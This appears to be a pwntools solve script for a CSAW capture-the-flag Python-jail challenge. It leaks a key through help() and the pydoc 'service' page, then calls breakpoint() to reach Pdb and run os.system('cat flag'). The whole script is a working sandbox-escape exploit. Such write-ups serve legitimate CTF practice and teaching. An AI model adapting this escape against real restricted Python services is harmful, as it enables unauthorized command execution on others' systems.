from pwn import *
from time import sleep

host = "misc.chal.csaw.io"
port = 9999
context.encoding = 'utf-8'
context.timeout = 10

def get_key():
    p = connect(host, port)
    # ru = lambda s: print(p.recvuntilS(s))
    ru = lambda s: p.recvuntil(s)
    sla = lambda r, s: p.sendlineafter(r, s)

    sla(b"> ", b"1")
    sla(b"> ", b"help()")
    sla(b"> ", b"service")
    sla(b"> ", b"1")
    sla(b"> ", b"help()")
    sla(b"> ", b"service")

    # For some reason there are a lot of backspace characters when fetching this.
    ru(b"    k")
    line = p.recvlineS()
    key = line.split(" = ")[1].replace("'", "")
    print("Found key", key)

    p.close()
    return key

def get_flag(key):
    p = connect(host, port)
    sla = lambda r, s: p.sendlineafter(r, s)

    sla(b"> ", b"2")
    sla(b"> ", key)
    sla(b"> ", b"breakpoint()")
    sla(b"(Pdb) ", b"import os; os.system('cat flag')")

    print(p.recvallS())
    print("Got flag!")
    p.close()

if __name__ == "__main__":
    key = get_key()
    sleep(1)
    get_flag(key)
